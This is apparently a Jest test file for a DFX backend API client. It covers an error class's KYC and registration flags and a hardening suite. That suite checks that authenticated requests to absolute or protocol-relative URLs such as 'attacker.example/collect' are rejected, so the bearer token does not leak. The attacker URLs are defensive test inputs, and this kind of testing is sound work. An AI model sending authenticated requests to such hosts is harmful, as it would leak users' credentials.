import { dfxApi, DfxApiError } from '../../src/features/dfx-backend/services/api';

describe('DfxApiError', () => {
  it('should create error with correct properties', () => {
    const error = new DfxApiError(400, 'AMOUNT_TOO_LOW', 'Amount is too low');

    expect(error.statusCode).toBe(400);
    expect(error.code).toBe('AMOUNT_TOO_LOW');
    expect(error.message).toBe('Amount is too low');
    expect(error.name).toBe('DfxApiError');
  });

  it('should detect KYC required errors', () => {
    const kycError = new DfxApiError(403, 'KYC_LEVEL_REQUIRED', 'KYC required');
    expect(kycError.isKycRequired).toBe(true);

    const kycDataError = new DfxApiError(403, 'KYC_DATA_REQUIRED', 'KYC data required');
    expect(kycDataError.isKycRequired).toBe(true);

    const otherError = new DfxApiError(400, 'AMOUNT_TOO_LOW', 'Amount too low');
    expect(otherError.isKycRequired).toBe(false);
  });

  it('should detect registration required errors', () => {
    const regError = new DfxApiError(403, 'REGISTRATION_REQUIRED', 'Registration required');
    expect(regError.isRegistrationRequired).toBe(true);

    const otherError = new DfxApiError(400, 'AMOUNT_TOO_LOW', 'Amount too low');
    expect(otherError.isRegistrationRequired).toBe(false);
  });

  it('should be an instance of Error', () => {
    const error = new DfxApiError(500, 'SERVER_ERROR', 'Internal server error');
    expect(error).toBeInstanceOf(Error);
    expect(error).toBeInstanceOf(DfxApiError);
  });
});

describe('dfxApi request hardening', () => {
  beforeEach(() => {
    globalThis.fetch = jest.fn(async () => ({
      ok: true,
      text: async () => '{}',
    })) as jest.Mock;
  });

  it('rejects absolute authenticated URLs to avoid bearer leakage', async () => {
    await expect(dfxApi.get('https://attacker.example/collect')).rejects.toMatchObject({
      code: 'INVALID_API_PATH',
    });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  it('rejects protocol-relative URLs', async () => {
    await expect(dfxApi.get('//attacker.example/collect')).rejects.toMatchObject({
      code: 'INVALID_API_PATH',
    });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  it('allows normal relative API paths', async () => {
    await dfxApi.get('/v1/asset');
    expect(globalThis.fetch).toHaveBeenCalledWith(
      'https://api.dfx.swiss/v1/asset',
      expect.objectContaining({ method: 'GET' }),
    );
  });
});
